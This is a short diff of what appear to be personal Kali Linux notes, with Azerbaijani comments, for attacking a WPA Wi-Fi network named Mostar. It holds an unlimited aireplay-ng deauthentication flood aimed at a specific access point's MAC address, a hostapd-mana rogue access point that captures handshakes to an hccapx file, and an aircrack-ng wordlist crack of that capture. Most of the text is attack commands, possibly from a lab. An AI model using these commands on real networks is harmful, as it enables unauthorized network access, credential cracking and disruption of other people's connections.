@@ -13,11 +13,14 @@ rsn_pairwise=TKIP CCMP
 mana_wpaout=/home/kali/mostar.hccapx
 ```
 
+kali@kali:~$ sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
+
+
+ise salannan sonra gozleyirik ki client bize qosulsun ozumuzu aktiv edirik
+
 kali@kali:~$ sudo hostapd-mana Mostar-mana.conf 
 
-ise salan kimi clientleri ayirib, tezeden qosulmaga mecbur eliyirik
 
-kali@kali:~$ sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
 
 
 aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
